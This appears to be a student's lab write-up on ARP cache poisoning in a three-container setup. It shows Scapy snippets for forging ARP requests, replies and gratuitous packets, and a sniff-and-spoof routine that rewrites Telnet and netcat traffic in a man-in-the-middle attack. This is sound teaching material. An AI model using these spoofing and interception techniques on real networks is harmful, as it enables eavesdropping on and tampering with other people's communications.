# ARP Cache Poisoning Lab
- The **Address Resolution Protocol (ARP)** is a protocol used for discovering the link layer address, such as MAC address, given an IP address. It is a very simple protocol without any security measure
- Using ARP cache poisoning attack, attackers can fool the victim into accepting forged IP-to-MAC mapping, which can cause the victim's packets to be redirected to the computer with the forged MAC address, leading to potential man-in-the-middle attacks
- topics
    - The ARP protocol
    - The ARP cache poisoning attack
    - Man-in-the-middle attack
    - Scapy programming

## Lab Setup
- 3 containers
    - Host M (Attacker): `10.9.0.105`, `02:42:0a:09:00:69`
    - Host A: `10.9.0.5`, `02:42:0a:09:00:05`
    - Host B: `10.9.0.6`, `02:42:0a:09:00:06`

## Task 1: ARP Cache Poisoning
- use packet spoofing to launch an ARP cache poisoning attack on a target, such that when two victims A and B try to communicate with each other, their packets will be interpreted by the attacker, who can make changes to the packets, and can thus become the man in the middle between A and B
- use Python to spoof a basic ARP packet
    ```
    E = Ether()
    A = ARP()
    A.op = 1 # 1 for ARP request; 2 for ARP reply
    sendp(E/A)
    ```
- see attribute names of ARP and Ether classes using `ls(ARP)` and `ls(Ether)`
- specifically, the attack should cause A to add a fake entry to its ARP cache, such that B's IP address is mapped to attacker M's MAC address, we can check a computer's ARP cache using `arp -n` command, we can use `-i <interface>` to look at the ARP cache associated with a specific interface

### Task 1.A (using ARP request)
- spoof an ARP packet that maps B's IP address to M's MAC address, and send it to A
    ```
    # a broadcast
    eth = Ether(dst='ff:ff:ff:ff:ff:ff')
    # send a request to A, with B's IP and M's MAC as source
    arp = ARP(pdst='10.9.0.5', psrc='10.9.0.6', hwsrc='02:42:0a:09:00:69')
    ```
- Analyze the captured packets in Wireshark
    1. a request, from M's MAC address, broadcast, `Who has 10.9.0.5? Tell 10.9.0.6`, when host A gets this packet, it will add an entry to its ARP cache: (M's MAC address, B's IP address)
    2. a reply, from A's MAC address to M's MAC address, `10.9.0.5 is at 02:42:0a:09:00:05`, but this will not add an entry to M's ARP cache

- on A
    ```
    # arp -n
    Address        HWtype  HWaddress           Flags Mask      Iface
    10.9.0.6       ether   02:42:0a:09:00:69   C               eth0
    ```

### Task 1.B (using ARP reply)
- first, clear A's ARP cache `ip -s -s neigh flush all`, then construct an ARP reply packet
    ```
    # a broadcast
    eth = Ether(dst='02:42:0a:09:00:05')
    # send a reply to A, with B's IP and M's MAC as source
    arp = ARP(pdst='10.9.0.5', hwdst='02:42:0a:09:00:05',  psrc='10.9.0.6', hwsrc='02:42:0a:09:00:69')
    ```
- scenario 1: B's IP is already in A's cache
    - to see the difference, use an ARP request to map B's IP to B's MAC in A's ARP cache
    - then, send an ARP reply that maps B's IP to M's MAC
    - successfully change this entry, map B's IP to M's MAC address
- scenario 2: B's IP is not in A's cache
    - clear the previous entry `arp -d 10.9.0.6`
    - no entry has been added to A's ARP cache

### Task 1.C (using ARP gratuitous message)
- *ARP gratuitous packet* is a special ARP request packet, it is used when a host machine needs to update outdated information on all the other machine's ARP cache, it has the following characteristics
    - the source and destination IP are the same, and they are the IP of the host issuing the gratuitous ARP
    - the destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC address `ff:ff:ff:ff:ff:ff`
    - No reply is expected
- on M, construct an ARP gratuitous packet, and use it to map B's IP to M's MAC
    - verify whether it is a gratuitous message: in Wireshark, there is only 1 ARP request packet, no reply
    - scenario 1: B's IP is already in A's cache (**success**)
    - scenario 2: B's IP is not in A's cache (**fail**)

### Another Method: ARP Announcement
- if we modify the program for task `1.A`, such that the destination IP is the same as the source IP (B's IP), the packet will be an ARP announcement, this method can also modify the ARP cache of A if B's IP address is already in A's ARP cache

## Task 2: MITM Attack on Telnet using ARP Cache Poisoning

### Step 1: Poison A's and B's ARP cache
- on host A
    ```
    # arp -n
    Address        HWtype  HWaddress           Flags Mask      Iface
    10.9.0.6       ether   02:42:0a:09:00:69   C               eth0
    ```
- on host B
    ```
    # arp -n
    Address        HWtype  HWaddress           Flags Mask      Iface
    10.9.0.5       ether   02:42:0a:09:00:69   C               eth0
    ```
### Step 2: Testing
- turn the IP forwarding of Host M off `sysctl net.ipv4.ip_forward=0`
- ping each other between A and B: unable to get reply

### Step 3: Turn on IP forwarding and test again
- `sysctl net.ipv4.ip_forward=1`
- both A and B can get reply when they ping each other
- However, in Wireshark, we can see that, if we take request from A as an example, the IP of the reply packet is B's IP, not M's IP, and if we check the ARP cache on A, the MAC address for B's IP has been modified to B's MAC address, this is because when A pings B, it will broadcast an ARP request asking for the MAC address of `10.9.0.6`, and according to task `1.B`, host B's reply will overwrite the entry in A's ARP cache

### Step 4: Launch the MITM attack
- assume that A is the Telnet client and B is the Telnet server
- after A has connected to the Telnet server on B, for every key strok typed in A's Telnet window, a TCP packet will be generated and sent to B, we will intercept the TCP packet, and replace each typed character with a fixed character `Z`
- write a sniff-and-spoof program, for packets sent from A to B, and spoof a TCP packet with different data, for packets from B to A, we do not make any change
- filter: `'tcp and host 10.9.0.5 and host 10.9.0.6 and ether dst 02:42:0a:09:00:69'`, because we don't want to capture packets from M to A or B
- core code that modifies the data
    ```
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            list_str = list(data)
            list_str[-1] = 'Z'
            newdata = ''.join(list_str)
            send(newpkt/newdata)
        else:
            send(newpkt)
    ```
- result: after running this program, when typing on A's Telnet window, no matter which key is typed, it becomes a letter `Z`
- tips: while doing this task, there is a possibility that the ARP cache of A or B is modified, because they sometimes will broadcast ARP requests asking for each other's MAC address, so we need to regularly check this, and invoke the ARP poisoning program again
## Task 3: MITM Attack on Netcat using ARP Cache Poisoning
- similar to task `2`, except that A and B are communicating using `netcat`
- on host B: `nc -lp 9090`
- on host A: `nc 10.9.0.6 9090`
- in `netcat`, each line of message typed on A will be put into a TCP packet sent to B, which simply displays the message
- replace the data with our first name (e.g., `123456789` -> `heisenbug`), the length of the modified data should be the same as the original data, or we will mess up the TCP sequence number, and hence the entire TCP connection
- remember that when typing `ABC` and enter, there will be 4 bytes of data (`'ABC'` and `\n`), I kept the last byte `'\n'`
- on host A's `netcat` window
    ```
    # nc 10.9.0.6 9090
    ABCDEFG12
    123X
    ```
- on host B
    ```
    # nc -lp 9090
    heisenbug
    heis
    ```
